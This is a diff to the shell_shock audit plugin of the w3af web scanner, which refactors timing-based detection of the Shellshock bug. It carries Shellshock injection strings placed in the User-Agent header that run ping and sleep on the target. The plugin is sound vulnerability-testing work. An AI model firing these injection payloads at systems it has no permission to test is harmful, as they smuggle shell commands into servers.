@@ -25,7 +25,8 @@ import w3af.core.data.constants.severity as severity
 
 from w3af.core.controllers.plugins.audit_plugin import AuditPlugin
 from w3af.core.controllers.delay_detection.exact_delay_controller import ExactDelayController
-from w3af.plugins.audit.os_commanding import PingDelay
+from w3af.core.controllers.delay_detection.exact_delay import ExactDelay
+from w3af.plugins.audit.os_commanding import Command
 from w3af.core.data.fuzzer.mutants.headers_mutant import HeadersMutant
 from w3af.core.data.kb.vuln import Vuln
 from w3af.core.data.bloomfilter.scalable_bloom import ScalableBloomFilter
@@ -34,11 +35,27 @@ from w3af.core.data.bloomfilter.scalable_bloom import ScalableBloomFilter
 TEST_HEADER = 'User-Agent'
 
 
+class PingDelay(Command, ExactDelay):
+    def __init__(self, delay_fmt):
+        Command.__init__(self, delay_fmt, 'unix', '')
+        ExactDelay.__init__(self, delay_fmt)
+        self._delay_delta = 1
+
+
+class SleepDelay(Command, ExactDelay):
+    def __init__(self, delay_fmt):
+        Command.__init__(self, delay_fmt, 'unix', '')
+        ExactDelay.__init__(self, delay_fmt)
+
+
 class shell_shock(AuditPlugin):
     """
     Find shell shock vulnerabilities.
     :author: Andres Riancho (andres.riancho@gmail.com)
     """
+    DELAY_TESTS = [PingDelay('() { test; }; ping -c %s 127.0.0.1'),
+                   ExactDelay('() { test; }; sleep %s')]
+
     def __init__(self):
         super(shell_shock, self).__init__()
         self.already_tested_urls = ScalableBloomFilter()
@@ -75,22 +92,20 @@ class shell_shock(AuditPlugin):
         mutant = HeadersMutant.create_mutants(freq, [''], [TEST_HEADER],
                                               False, fuzzer_config)[0]
 
-        # Unix
-        test_fmt = '() { test; }; ping -c %s localhost'
-        delay_obj = PingDelay(test_fmt, 'unix', '')
+        for delay_obj in self.DELAY_TESTS:
+            ed = ExactDelayController(mutant, delay_obj, self._uri_opener)
+            success, responses = ed.delay_is_controlled()
 
-        ed = ExactDelayController(mutant, delay_obj, self._uri_opener)
-        success, responses = ed.delay_is_controlled()
+            if success:
+                mutant.set_token_value(delay_obj.get_string_for_delay(3))
+                desc = 'Shell shock was found at: %s' % mutant.found_at()
 
-        if success:
-            mutant.set_token_value(test_fmt % 3)
-            desc = 'Shell shock was found at: %s' % mutant.found_at()
+                v = Vuln.from_mutant('Shell shock vulnerability', desc,
+                                     severity.HIGH, [r.id for r in responses],
+                                     self.get_name(), mutant)
 
-            v = Vuln.from_mutant('Shell shock vulnerability', desc,
-                                 severity.HIGH, [r.id for r in responses],
-                                 self.get_name(), mutant)
-
-            self.kb_append_uniq(self, 'shell_shock', v)
+                self.kb_append_uniq(self, 'shell_shock', v)
+                break
 
     def get_long_desc(self):
         """
